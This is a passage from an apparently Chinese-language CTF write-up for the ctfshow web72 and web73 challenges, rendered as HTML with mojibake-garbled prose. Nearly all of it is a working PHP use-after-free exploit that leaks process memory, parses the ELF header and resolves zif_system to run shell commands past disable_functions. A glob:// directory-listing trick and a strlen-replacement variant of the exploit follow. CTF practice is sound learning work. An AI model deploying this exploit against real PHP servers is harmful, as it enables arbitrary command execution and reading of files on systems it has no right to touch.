&amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°ä»£ç å½“ä½œå‚æ•°POSTä¼ å‚ï¼Œè¦è®°å¾—ç¼–ç ï¼ŒæˆåŠŸæ‹¿åˆ°flag</p><h1 id="web73"><a href="#web73" class="headerlink" title="web73()"></a>web73()</h1><p>è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œå°è¯•ç”¨<code>glob://</code>è¯»å–ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>å‘ç°flagæ–‡ä»¶åä¸º<code>flagc.txt</code></p><p>ç»§ç»­é€šè¿‡uafè„šæœ¬è¯»å–æ–‡ä»¶</p><p>å‘ç°ä¸è¡Œï¼Œ<code>strlen</code>ä¸è®©ç”¨äº†ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªæ›¿æ¢å‡½æ•°æ¥æ›¿æ¢<code>strlen</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$s</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°ä»£ç æ”¾åˆ°uafè„šæœ¬ä¸­ï¼Œå°†<code>strlen</code>å‡½æ•°æ›¿æ¢ï¼Œæœ€ç»ˆuafè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$ret</span>++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">str_user</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span 